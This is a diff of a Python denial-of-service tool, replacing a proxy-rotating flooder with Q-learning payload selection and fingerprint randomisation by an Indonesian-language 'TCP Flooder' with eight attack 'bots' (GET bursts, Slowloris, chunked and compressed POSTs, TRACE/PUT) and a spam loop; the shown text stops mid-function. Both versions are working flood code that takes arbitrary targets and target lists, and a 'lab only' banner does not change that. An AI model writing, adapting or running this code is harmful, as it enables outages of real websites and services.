@@ -1,777 +1,629 @@
-import os, time, signal, random, threading, socket, requests, base64, asyncio, aiohttp
-import json, math
-from aiohttp import ClientSession, TCPConnector, ClientTimeout
-from dataclasses import dataclass, field
-from rich.console import Console
-from rich.panel import Panel
-from rich.table import Table
-from rich.live import Live
-from rich.align import Align
-from rich.text import Text
-from urllib.parse import urlparse
-from aioquic.asyncio.client import connect
-from aioquic.h3.connection import H3_ALPN
-from aioquic.quic.configuration import QuicConfiguration
+# TCP Flooder Lab Test - v4.0 EPIC HACKER EDITION + Bot Swarm + SPAMMER BOT
+# ⚠️ DISCLAIMER: Gunakan hanya di lab/test server yang kamu kontrol sendiri
+# 🔥 Ultimate Visual + 8 Bots + Spammer with Loop
 
-console = Console()
+import socket, random, threading, time, os, sys, json, ssl, zlib
+import urllib.parse
+from datetime import datetime
+import urllib.request
 
-BANNER = r"""
-███████╗██╗      ██████╗  ██████╗ ██████╗     ██╗    ██╗ ██████╗ ██╗     ███████╗
-██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    ██║    ██║██╔═══██╗██║     ██╔════╝
-█████╗  ██║     ██║   ██║██║   ██║██║  ██║    ██║ █╗ ██║██║   ██║██║     █████╗  
-██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ██║███╗██║██║   ██║██║     ██╔══╝  
-██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    ╚███╔███╔╝╚██████╔╝███████╗██║     
-╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝      ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
-"""
-
-user_agents = [
-    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.3",
-    "Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
-    "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.194 Mobile Safari/537.36 EdgA/143.0.3650.139",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.3124.85",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/134.3124.77 Mobile/15E148 Safari/605.1.15"
+useragents = [
+    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
+    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0",
+    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+    "Mozilla/5.0 (Windows; U;; en-NZ) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
 ]
 
-# === Global Stats ===
-status_codes, proxy_fail_count, proto_stats, proxy_success = {}, {}, {}, []
+ref = [
+    'http://www.bing.com/search?q=',
+    'https://www.yandex.com/yandsearch?text=',
+    'https://duckduckgo.com/?q='
+]
 
-@dataclass
-class SessionStats:
-    start_ts: float = field(default_factory=time.time)
-    events: int = 0
-    ok: int = 0
-    fail: int = 0
-    last: str = "-"
-    attack_mode: str = "-"
-    attack_ok: int = 0
-    attack_fail: int = 0
-    total_bytes: int = 0
-    active_threads: int = 0
+acceptall = [
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\n"
+]
 
-    def uptime(self): 
-        return time.time() - self.start_ts
+# Definisi warna EPIC Cyberpunk Hacker Aesthetic
+G = "\033[92m"   # Green Matrix
+C = "\033[96m"   # Cyan Electric
+O = "\033[38;5;208m"  # Orange
+M = "\033[91m"   # Red Alert
+K = "\033[93m"   # Yellow Warning
+P = "\033[95m"   # Purple/Magenta
+A = "\033[90m"   # Gray Shadow
+W = "\033[97m"   # White Bright
+B = "\033[1m"    # Bold
+DIM = "\033[2m"  # Dim
+U = "\033[4m"    # Underline
+R = "\033[0m"    # Reset
+BG_R = "\033[41m" # Background Red
+BG_G = "\033[42m" # Background Green
 
-    def rate(self): 
-        return (self.events / self.uptime()) if self.uptime() > 0 else 0.0
+def clear_screen():
+    os.system("clear" if os.name != "nt" else "cls")
 
-    def bandwidth(self): 
-        return (self.total_bytes / 1024 / 1024) / self.uptime() if self.uptime() > 0 else 0.0
+def print_slowly(text, delay=0.01):
+    """Animasi print character by character"""
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+    print()
 
-# === Save/Load Q-Table (session memory) ===
-def save_qtable(filename="qtable.json"):
-    global Q_table
-    with open(filename, "w") as f:
-        json.dump(Q_table, f)
+def print_border(char="═", length=80, color=C):
+    """Print border dengan warna"""
+    print(f"{color}{char * length}{R}")
 
-def load_qtable(filename="qtable.json"):
-    global Q_table
-    if os.path.exists(filename):
-        with open(filename, "r") as f:
-            data = json.load(f)
-            for m in modes:
-                if m not in data:
-                    data[m] = {n:0.0 for n in modes}
+def print_box(text, width=80, color=G):
+    """Print text dalam box"""
+    padding = width - len(text) - 4
+    left_pad = padding // 2
+    right_pad = padding - left_pad
+    print(f"{color}║{R} {' ' * left_pad}{B}{text}{R}{' ' * right_pad} {color}║{R}")
+
+def get_public_ip():
+    """Deteksi IP public (support Tor/Proxychains)"""
+    ip_services = [
+        'https://api.ipify.org',
+        'https://icanhazip.com',
+        'https://ifconfig.me/ip',
+        'https://ipinfo.io/ip',
+        'http://checkip.amazonaws.com'
+    ]
+    
+    for service in ip_services:
+        try:
+            req = urllib.request.Request(service, headers={'User-Agent': random.choice(useragents)})
+            with urllib.request.urlopen(req, timeout=5) as response:
+                ip = response.read().decode('utf-8').strip()
+                return ip
+        except:
+            continue
+    
+    return "Unable to detect"
+
+clear_screen()
+
+# ===================== EPIC LOGO CYBERPUNK EDITION =====================
+print_border("╔", 80, P)
+print(f"""{P}╔══════════════════════════════════════════════════════════════════════════════╗{R}""")
+
+art_epic = f"""
+{K}    ███████╗██╗      ██████╗  ██████╗ ██████╗     ██████╗  ██████╗ ████████╗{R}
+{K}    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝{R}
+{O}    █████╗  ██║     ██║   ██║██║   ██║██║  ██║    ██████╔╝██║   ██║   ██║   {R}
+{O}    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ██╔══██╗██║   ██║   ██║   {R}
+{M}    ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    ██████╔╝╚██████╔╝   ██║   {R}
+{M}    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   {R}
+"""
+print(art_epic)
+
+print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
+print_box(f"{G}█▓▒░ HYBRID FLOOD PROTOCOL v4.0 EPIC EDITION ░▒▓█{R}", 80, P)
+print_box(f"{C}SYSTEM INITIALIZED - 8 BOTS READY - SPAMMER ACTIVE{R}", 80, P)
+print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
+
+bot_list = [
+    f"{G}[BOT-01]{R} {C}Alpha{R}     {DIM}→ GET burst attack{R}                              ",
+    f"{G}[BOT-02]{R} {C}Bravo{R}     {DIM}→ POST JSON payload{R}                             ",
+    f"{G}[BOT-03]{R} {C}Charlie{R}   {DIM}→ HEAD/OPTIONS fuzzing{R}                          ",
+    f"{G}[BOT-04]{R} {C}Delta{R}     {DIM}→ Slowloris connection{R}                          ",
+    f"{G}[BOT-05]{R} {C}Echo{R}      {DIM}→ Chunked encoding{R}                              ",
+    f"{G}[BOT-06]{R} {C}Foxtrot{R}   {DIM}→ Compressed payload{R}                            ",
+    f"{G}[BOT-07]{R} {C}Gamma{R}     {DIM}→ TRACE/PUT methods{R}                             ",
+    f"{M}[BOT-08]{R} {M}{B}Spammer{R}   {DIM}→ {M}HTTP spam attack (1-4000 loop){R}                "
+]
+
+for bot in bot_list:
+    print(f"{P}║{R} {bot.ljust(88)} {P}║{R}")
+
+print(f"{P}╠══════════════════════════════════════════════════════════════════════════════╣{R}")
+print_box(f"{K}⚠️  WARNING: USE ONLY ON YOUR OWN LAB/TEST SERVERS ⚠️{R}", 80, P)
+print(f"{P}╚══════════════════════════════════════════════════════════════════════════════╝{R}")
+print()
+
+# ===================== USER INPUT SECTION =====================
+print_border("─", 80, C)
+print(f"{B}{G}[CONFIGURATION PANEL]{R}")
+print_border("─", 80, C)
+
+url_input = str(input(f'{G}[+]{R} Target URL/IP {DIM}(https://... or url.txt/ip.txt){R}: '))
+pack = int(input(f'{G}[+]{R} Packet/s {DIM}(how many packets per connection){R}: '))
+thread_count = int(input(f'{G}[+]{R} Threads {DIM}(concurrent bots){R}: '))
+
+# ===================== SPAMMER BOT CONFIGURATION =====================
+print()
+print_border("─", 80, M)
+print(f"{B}{M}[SPAMMER BOT CONFIGURATION]{R}")
+print_border("─", 80, M)
+print(f"{M}Bot Spammer{R} akan membuka URL target secara berulang dengan loop 1-4000")
+
+enable_spammer = str(input(f'{M}[?]{R} Aktifkan Bot Spammer? {C}(y/n){R}: ')).lower()
+spammer_iterations = 0
+
+if enable_spammer == 'y':
+    while True:
+        try:
+            spam_choice = int(input(f'{M}[+]{R} Pilih spam count {DIM}(1-4000){R}: '))
+            if 1 <= spam_choice <= 4000:
+                spammer_iterations = spam_choice
+                print(f"{G}[✓]{R} Bot Spammer aktif dengan {M}{spam_choice}{R} iterations dalam loop!")
+                break
+            else:
+                print(f"{M}[!]{R} Nilai harus antara 1-4000!")
+        except ValueError:
+            print(f"{M}[!]{R} Input tidak valid!")
+else:
+    print(f"{K}[!]{R} Bot Spammer dinonaktifkan")
+
+print_border("─", 80, C)
+print()
+
+# Load multi-target dari file
+targets = []
+if url_input.endswith(".txt"):
+    try:
+        with open(url_input,"r") as f:
+            for line in f:
+                line=line.strip()
+                if not line: continue
+                if line.startswith("http://") or line.startswith("https://"):
+                    targets.append(line)
                 else:
-                    for n in modes:
-                        if n not in data[m]:
-                            data[m][n] = 0.0
-            Q_table = data
+                    targets.append(f"ip://{line}")
+        print(f"{G}[✓]{R} Loaded {len(targets)} targets from file")
+    except Exception as e:
+        print(f"{M}[✗]{R} Error membaca file: {e}")
+        sys.exit(1)
+else:
+    if url_input.startswith("http://") or url_input.startswith("https://"):
+        targets = [url_input]
+    else:
+        targets = [f"ip://{url_input}"]
 
+# ===================== STATISTICS INITIALIZATION =====================
+stats_global = {"sent":0,"hits":0,"fail":0,"error":0}
+stats_bot = {}
+stats_target = {t:{"sent":0,"hits":0,"fail":0,"error":0,"monitor":"UNKNOWN"} for t in targets}
 
-class HackerUI:
-    def __init__(self, tool_name="Flood Wolf Brutal", user="ExProGm411"):
-        self.tool_name = tool_name
-        self.user = user
-        self.stats = SessionStats()
-        self._stop = False
-        signal.signal(signal.SIGINT, self._on_sigint)
-
-    def _on_sigint(self, sig, frame): 
-        self._stop = True
-        self.report(title="SESSION REPORT")
-
-    def stopped(self): 
-        return self._stop
-
-    def boot(self, config_lines=None):
-        os.system("clear")
-        console.print(Panel.fit(Text(BANNER, style="red"), border_style="red"))
-        cfg = "\n".join([f"[cyan]•[/cyan] {x}" for x in config_lines]) if config_lines else ""
-        console.print(Panel.fit(
-            f"[bold]Tool:[/bold] {self.tool_name}\n[bold]User:[/bold] {self.user}\n[bold]Status:[/bold] [green]READY[/green]\n\n{cfg}",
-            title="[bold red]BOOT[/bold red]", border_style="red"))
-
-    def tick_ok(self, last_text, send_size=0):
-        self.stats.events += 1
-        self.stats.ok += 1
-        self.stats.total_bytes += send_size
-        self.stats.last = f"[green][+] {last_text}[/green]"
-
-    def tick_fail(self, last_text):
-        self.stats.events += 1
-        self.stats.fail += 1
-        self.stats.last = f"[red][-] {last_text}[/red]"
-
-    def set_attack_mode(self, mode, ok, fail):
-        self.stats.attack_mode, self.stats.attack_ok, self.stats.attack_fail = mode, ok, fail
-
-    def live(self): 
-        return Live(self._dashboard(), refresh_per_second=12, console=console)
-
-    def _dashboard(self, title="RUNNING"):
-        t = Table.grid(padding=(0, 1))
-        t.add_column(justify="right", style="cyan", width=14)
-        t.add_column(justify="left", style="white")
-        t.add_row("Uptime", f"{self.stats.uptime():,.1f}s")
-        t.add_row("Events", f"{self.stats.events:,}")
-        t.add_row("OK / FAIL", f"{self.stats.ok:,} / {self.stats.fail:,}")
-        t.add_row("Rate", f"{self.stats.rate():,.2f} / sec")
-        t.add_row("Bandwidth", f"{self.stats.bandwidth():,.2f} MB/sec")
-        t.add_row("Threads", f"{self.stats.active_threads}")
-        t.add_row("Last", self.stats.last)
-        return Panel(Align.left(t), title=f"[bold red]{title}[/bold red]", border_style="red")
-
-    def update_live(self, live, title="RUNNING"): 
-        live.update(self._dashboard(title=title))
-
-    def report(self, title="SESSION REPORT"):
-        # Session Overview
-        table = Table(title=f"[bold magenta]{title}[/bold magenta]", border_style="magenta", show_lines=True)
-        table.add_column("Metric", style="cyan", no_wrap=True)
-        table.add_column("Value", style="white")
-        table.add_row("Uptime", f"{self.stats.uptime():,.2f}s")
-        table.add_row("Total Events", f"{self.stats.events:,}")
-        table.add_row("OK", f"{self.stats.ok:,}")
-        table.add_row("FAIL", f"{self.stats.fail:,}")
-        table.add_row("Avg Rate", f"{self.stats.rate():,.2f} / sec")
-        table.add_row("Bandwidth", f"{self.stats.bandwidth():,.2f} MB/sec")
-        table.add_row("Threads", f"{self.stats.active_threads}")
-        table.add_row("Last Event", self.stats.last)
-        console.print(table)
-
-        # Status Code Breakdown
-        if status_codes:
-            sc_table = Table(title="[bold magenta]Status Code Breakdown[/bold magenta]", border_style="magenta")
-            sc_table.add_column("Code", style="cyan")
-            sc_table.add_column("Count", style="white")
-            for code, count in status_codes.items():
-                sc_table.add_row(str(code), str(count))
-            console.print(sc_table)
-
-        # Payload Mode Summary
-        mode_table = Table(title="[bold magenta]Payload Mode Summary[/bold magenta]", border_style="magenta", show_lines=True)
-        mode_table.add_column("Mode", style="cyan")
-        mode_table.add_column("Sent", style="white")
-        mode_table.add_column("Success", style="green")
-        mode_table.add_column("Fail", style="red")
-        mode_table.add_column("Avg Latency", style="yellow")
-
-        for mode in payload_stats.keys():
-            sent = payload_stats.get(mode, 0) + fail_stats.get(mode, 0)
-            success = payload_stats.get(mode, 0)
-            fail = fail_stats.get(mode, 0)
-            avg_latency = sum(latency_stats[mode]) / len(latency_stats[mode]) if latency_stats[mode] else 0
-            mode_table.add_row(mode, str(sent), str(success), str(fail), f"{avg_latency:.2f}s")
-
-        console.print(mode_table)
-
-        # Adaptive Intelligence
-        ai_table = Table(title="[bold magenta]Adaptive Intelligence[/bold magenta]", border_style="magenta", show_lines=True)
-        ai_table.add_column("Mode", style="cyan")
-        ai_table.add_column("Avg Latency (s)", style="white")
-        ai_table.add_column("Samples", style="green")
-        ai_table.add_column("Top Error", style="red")
-        ai_table.add_column("Error Count", style="yellow")
-
-        for mode in payload_stats.keys():
-            if latency_stats[mode]:
-                avg_latency = sum(latency_stats[mode]) / len(latency_stats[mode])
-                samples = len(latency_stats[mode])
-                latency_str = f"{avg_latency:.3f}"
-            else:
-                latency_str = "-"
-                samples = 0
-
-            if error_stats[mode]:
-                top_err = max(error_stats[mode], key=error_stats[mode].get)
-                err_count = error_stats[mode][top_err]
-            else:
-                top_err = "-"
-                err_count = 0
-
-            ai_table.add_row(mode, latency_str, str(samples), str(top_err), str(err_count))
-
-        console.print(ai_table)
-
-        # TCP/UDP Breakdown
-        if proto_stats:
-            proto_table = Table(title="[bold magenta]TCP/UDP Breakdown[/bold magenta]", border_style="magenta")
-            proto_table.add_column("Type", style="cyan")
-            proto_table.add_column("Count", style="white")
-            for key, count in proto_stats.items():
-                proto_table.add_row(key, str(count))
-            console.print(proto_table)
-
-        # Proxy Performance Summary
-        if proxy_success or proxy_fail:
-            proxy_table = Table(title="[bold magenta]Proxy Performance Summary[/bold magenta]", border_style="magenta", show_lines=True)
-            proxy_table.add_column("Proxy", style="cyan")
-            proxy_table.add_column("Success", style="green")
-            proxy_table.add_column("Fail", style="red")
-            proxy_table.add_column("Weight", style="yellow")
-
-            proxies = set(list(proxy_success.keys()) + list(proxy_fail.keys()))
-            for p in proxies:
-                success = proxy_success.get(p, 0)
-                fail = proxy_fail.get(p, 0)
-                weight = max(1, (success + 1) - fail)
-                label = "[green]High[/green]" if weight > 5 else "[yellow]Medium[/yellow]" if weight > 2 else "[red]Low[/red]"
-                proxy_table.add_row(p, str(success), str(fail), label)
-
-            console.print(proxy_table)
-
-        # Save proxy results
-        if proxy_success:
-            with open("proxy_success.txt", "w") as f:
-                for p in proxy_success.keys():
-                    f.write(f"{p} SUCCESS:{proxy_success[p]}\n")
-            console.print(f"[green][+] Saved {len(proxy_success)} successful proxies to proxy_success.txt[/green]")
-        else:
-            console.print("[yellow][!] Tidak ada proxy yang berhasil digunakan.[/yellow]")
-
-        if proxy_fail:
-            with open("proxy_fail.txt", "w") as f:
-                for p, count in proxy_fail.items():
-                    f.write(f"{p} FAILS:{count}\n")
-            console.print(f"[red][-] Saved {len(proxy_fail)} failed proxies to proxy_fail.txt[/red]")
-
-        # Exit Panel
-        console.print(Panel.fit("[bold green]Exit clean. Respect.[/bold green]", border_style="green"))
-
-        # ✅ Save Q-Table at the end of report
-        save_qtable()
-        console.print("[cyan][+] Q-Table saved to qtable.json[/cyan]")
-
-    # === Helper functions ===
-def load_proxies(filename):
-    try:
-        with open(filename, "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        return []
-
-def check_alive(ip, port):
-    try:
-        s = socket.create_connection((ip, port), timeout=3)
-        s.close()
-        return True
-    except:
-        return False
-
-# === Payload generator (brutal + mixed) ===
-mode_colors = {
-    "hex": "cyan",
-    "json": "green",
-    "header": "yellow",
-    "plain": "white",
-    "mutate": "blue",
-    "mixed": "magenta"
+bots = {
+    "Alpha":"GET burst",
+    "Bravo":"POST JSON",
+    "Charlie":"HEAD/OPTIONS",
+    "Delta":"Slowloris",
+    "Echo":"Chunked",
+    "Foxtrot":"Compressed",
+    "Gamma":"TRACE/PUT",
+    "Spammer":"HTTP Spam Loop"
 }
 
+# Inisialisasi semua bot
+for bot in bots.keys():
+    stats_bot[bot] = {"sent":0,"hits":0,"fail":0,"error":0}
 
+# ===================== HELPER FUNCTIONS =====================
+def rand_string(n=None):
+    length = n if n else random.randint(5,200)
+    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789",k=length))
 
-# === Adaptive AI Payload Generator v2 ===
-payload_stats = {"hex":0, "json":0, "header":0, "plain":0, "mutate":0, "mixed":0}
-fail_stats = {"hex":0, "json":0, "header":0, "plain":0, "mutate":0, "mixed":0}
-latency_stats = {"hex":[], "json":[], "header":[], "plain":[], "mutate":[], "mixed":[]}
-error_stats = {"hex":{}, "json":{}, "header":{}, "plain":{}, "mutate":{}, "mixed":{}}
-current_mode = None
-
-# === Proxy Smart Selector ===
-proxy_success = {}
-proxy_fail = {}
-
-def update_proxy_stats(proxy, success=True):
-    if success:
-        proxy_success[proxy] = proxy_success.get(proxy, 0) + 1
-    else:
-        proxy_fail[proxy] = proxy_fail.get(proxy, 0) + 1
-
-def choose_proxy(proxies):
-    weighted_proxies = []
-    for p in proxies:
-        success_count = proxy_success.get(p, 0)
-        fail_count = proxy_fail.get(p, 0)
-        weight = max(1, (success_count + 1) - fail_count)
-        weighted_proxies.extend([p] * weight)
-    return random.choice(weighted_proxies) if weighted_proxies else random.choice(proxies)
-
-# === Load/Save Session Memory ===
-def load_payload_history():
-    if os.path.exists("payload_history.json"):
-        with open("payload_history.json", "r") as f:
-            data = json.load(f)
-            for mode in payload_stats.keys():
-                payload_stats[mode] = data.get("payload_stats", {}).get(mode, 0)
-                fail_stats[mode] = data.get("fail_stats", {}).get(mode, 0)
-
-def save_payload_history():
-    data = {"payload_stats": payload_stats, "fail_stats": fail_stats}
-    with open("payload_history.json", "w") as f:
-        json.dump(data, f)
-
-
-# === Adaptive Payload Q-Learning ===
-
-# === Stats & Rewards ===
-modes = ["hex","json","header","plain","mutate","mixed"]
-payload_stats = {m:0 for m in modes}
-fail_stats = {m:0 for m in modes}
-latency_stats = {m:[] for m in modes}
-error_stats = {m:{} for m in modes}
-
-# === Q-Table (state → action) ===
-Q_table = {m: {n: 0.0 for n in modes} for m in modes}
-current_mode = random.choice(modes)
-last_mode = None
-
-# === Proxy Stats ===
-proxy_success, proxy_fail = {}, {}
-
-def update_proxy_stats(proxy, success=True):
-    if success:
-        proxy_success[proxy] = proxy_success.get(proxy, 0) + 1
-    else:
-        proxy_fail[proxy] = proxy_fail.get(proxy, 0) + 1
-
-# === Q-Learning Chooser (epsilon-greedy) ===
-def choose_mode_q(state, epsilon=0.1):
-    if random.random() < epsilon:
-        return random.choice(modes)
-    return max(Q_table[state], key=Q_table[state].get)
-
-# === Q-Table Update ===
-def update_qtable(state, action, reward, next_state, alpha=0.1, gamma=0.9):
-    best_next = max(Q_table[next_state].values())
-    Q_table[state][action] += alpha * (reward + gamma * best_next - Q_table[state][action])
-
-# === Adaptive Payload Q ===
-def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, proxy=None):
-    global current_mode, last_mode
-
-    # hitung reward
-    reward = 0
-    if last_status == 200:
-        reward += 2
-    elif last_status:
-        reward -= 1
-    if latency:
-        reward -= latency
-    if error_type:
-        reward -= 2
-
-    # update statistik
-    if current_mode:
-        payload_stats[current_mode] += 1
-        if last_status != 200:
-            fail_stats[current_mode] += 1
-        if latency:
-            latency_stats[current_mode].append(latency)
-            if len(latency_stats[current_mode]) > 50:
-                latency_stats[current_mode] = latency_stats[current_mode][-50:]
-        if error_type:
-            error_stats[current_mode][error_type] = error_stats[current_mode].get(error_type, 0) + 1
-
-    # update Q-table
-    if last_mode is not None:
-        update_qtable(last_mode, current_mode, reward, current_mode)
-
-    # pilih mode berikutnya
-    next_mode = choose_mode_q(current_mode)
-    last_mode = current_mode
-    current_mode = next_mode
-
-    # dynamic payload size
-    size_factor = 1.0
-    if latency and latency > 2.0: size_factor = 0.5
-    elif latency and latency < 1.0: size_factor = 1.5
-    if proxy and proxy_fail.get(proxy,0) > proxy_success.get(proxy,0):
-        if current_mode in ["mutate","mixed"]:
-            size_factor *= 0.7
-
-    # generate payload sesuai mode
-    if current_mode == "hex":
-        payload_body = "".join(random.choice("0123456789ABCDEF") for _ in range(int(random.randint(2048,8192)*size_factor)))
-    elif current_mode == "json":
-        payload_body = '{"data":"%s"}' % ("X"*int(random.randint(1024,4096)*size_factor))
-    elif current_mode == "header":
-        headers = [f"X-Custom-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(64))}"
-                   for _ in range(random.randint(5,20))]
-        payload_body = "\r\n".join(headers)
-    elif current_mode == "mutate":
-        raw = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(int(random.randint(4096,8192)*size_factor)))
-        payload_body = base64.b64encode(raw.encode()).decode()
-    elif current_mode == "mixed":
-        headers = [f"X-Mixed-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(32))}"
-                   for _ in range(random.randint(3,10))]
-        json_part = '{"mix":"%s"}' % ("Y"*int(random.randint(512,2048)*size_factor))
-        hex_part = "".join(random.choice("0123456789ABCDEF") for _ in range(int(random.randint(1024,4096)*size_factor)))
-        payload_body = "\r\n".join(headers)+"\r\n"+json_part+"\r\n"+hex_part
-    else:
-        payload_body = "A"*int(random.randint(2048,8192)*size_factor)
-
-    payload = (f"User-Agent: {ua}\r\nX-Mode: {current_mode}\r\n"+payload_body).encode()
-    return payload, len(payload), current_mode
-    
-# === Utility untuk TLS, HTTP/2, Endpoint, Header Consistency ===
-
-def randomize_cipher_suites():
-    suites = [
-        "TLS_AES_128_GCM_SHA256",
-        "TLS_AES_256_GCM_SHA384",
-        "TLS_CHACHA20_POLY1305_SHA256"
+def generate_headers(botname,target):
+    headers = [
+        "User-Agent: " + random.choice(useragents),
+        "Referer: " + random.choice(ref) + target,
+        "X-Bot-ID: " + botname,
+        "X-Bot-Mode: " + bots[botname],
+        "X-Custom-Payload: " + rand_string(),
+        random.choice(acceptall)
     ]
-    random.shuffle(suites)
-    return suites
+    random.shuffle(headers)
+    return "\r\n".join(headers) + "\r\n"
 
-def random_h2_settings():
-    return {
-        "HEADER_TABLE_SIZE": random.choice([4096, 8192]),
-        "INITIAL_WINDOW_SIZE": random.choice([65535, 131072])
-    }
+def generate_body_json():
+    body = {"id":rand_string(6),"msg":rand_string(random.randint(5,20)),"flag":random.choice([True,False])}
+    return json.dumps(body)
 
-def choose_endpoint():
-    resources = ["/", "/style.css", "/app.js", "/main.js"]
-    return random.choice(resources)
+def generate_chunked_body():
+    chunks=[]
+    for _ in range(random.randint(2,5)):
+        data=rand_string(random.randint(5,30))
+        chunks.append(f"{len(data):X}\r\n{data}\r\n")
+    chunks.append("0\r\n\r\n")
+    return "".join(chunks)
 
-def consistent_headers(ua, payload):
-    return {
-        "User-Agent": ua,
-        "Accept-Encoding": "gzip, deflate, br",
-        "Content-Length": str(len(payload)),
-        "Connection": "keep-alive"
-    }
-# === Adaptive Timing (Jittering + Latency Aware) ===
+def compressed_body():
+    data=rand_string(200)
+    return zlib.compress(data.encode())
 
-def adaptive_sleep(latency, delay_min, delay_max):
-    if latency and latency > 2.0:
-        delay_min += 0.2
-        delay_max += 0.5
-    time.sleep(random.uniform(delay_min, delay_max))
+def build_request(method,botname,host,path,target):
+    headers=generate_headers(botname,target)
+    if method=="GET":
+        request_line=f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
+    elif method=="POST":
+        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"; body=generate_body_json()
+    elif method=="CHUNKED":
+        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n"; body=generate_chunked_body()
+    elif method=="COMPRESS":
+        request_line=f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
+        body=compressed_body().decode('latin1','ignore'); headers+="Accept-Encoding: gzip\r\n"
+    else: # HEAD/OPTIONS/TRACE/PUT
+        request_line=f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"; body=""
+    length=f"Content-Length: {len(body)}\r\nConnection: Keep-Alive\r\n"
+    return request_line+headers+length+"\r\n"+body
 
-async def adaptive_sleep_async(latency, delay_min, delay_max):
-    if latency and latency > 2.0:
-        delay_min += 0.2
-        delay_max += 0.5
-    await asyncio.sleep(random.uniform(delay_min, delay_max))
+# ===================== BOT SPAMMER FUNCTION =====================
+def spammer_bot():
+    """Bot khusus untuk spam buka web dengan loop"""
+    global stats_global, stats_bot, stats_target
     
-    
-# === HTTP/1.1 mode + TCP/UDP fallback ===
-def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
-    proxy_index = 0
-    last_status = None
-    while not ui.stopped():
-        try:
-            ua = random.choice(user_agents)
-            start = time.time()
-            payload, send_size, mode = adaptive_payload_q(ua, last_status)
-
-            proxy = None
-            if proxies:
-                proxy = proxies[proxy_index]
-                proxy_index = (proxy_index + 1) % len(proxies)
-
-            if target_url:  # HTTP/1.1
-                try:
-                    target_path = choose_endpoint()
-                    r = requests.post(target_url + target_path,
-                                      headers=consistent_headers(ua, payload),
-                                      data=payload,
-                                      proxies={"http": proxy, "https": proxy} if proxy else None,
-                                      timeout=3)
-                    latency = time.time() - start
-                    last_status = r.status_code
-                    adaptive_payload_q(ua, last_status, latency, proxy=proxy)
